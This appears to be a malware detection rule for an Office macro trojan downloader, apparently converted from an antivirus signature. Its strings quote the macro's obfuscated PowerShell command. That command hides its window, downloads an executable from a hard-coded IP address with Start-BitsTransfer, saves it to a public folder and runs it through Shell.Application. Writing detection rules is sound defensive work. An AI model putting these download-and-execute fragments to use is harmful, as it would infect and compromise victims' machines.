
rule TrojanDownloader_O97M_EncDoc_PDS_MTB{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.PDS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 01 00 "
		
	strings :
		$a_01_0 = {2d 77 20 68 69 20 73 6c 65 65 5e 70 20 2d 53 65 20 33 31 3b 53 74 61 5e 72 74 2d 42 69 74 73 54 5e 72 61 6e 73 66 65 72 20 2d 53 6f 75 72 63 65 20 68 74 74 60 70 3a 2f 2f 31 38 2e 31 39 35 2e 31 33 33 2e 32 32 36 2f 44 44 2f 45 2f 49 4d 47 5f 35 30 31 33 37 30 30 30 30 31 32 35 2e 65 60 78 65 22 } //01 00  -w hi slee^p -Se 31;Sta^rt-BitsT^ransfer -Source htt`p://18.195.133.226/DD/E/IMG_501370000125.e`xe"
		$a_01_1 = {2d 44 65 73 74 69 6e 61 74 69 6f 6e 20 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c 62 65 61 74 74 65 61 6d 2e 65 60 78 65 22 20 26 } //01 00  -Destination C:\Users\Public\Documents\beatteam.e`xe" &
		$a_01_2 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 73 68 65 65 65 20 26 20 22 6c 2e 61 70 70 6c 69 63 61 74 69 6f 6e 22 29 2e 4f 70 65 6e 28 72 65 66 6c 65 63 74 72 65 61 73 6f 6e 29 } //00 00  CreateObject(sheee & "l.application").Open(reflectreason)
	condition:
		any of ($a_*)
 
}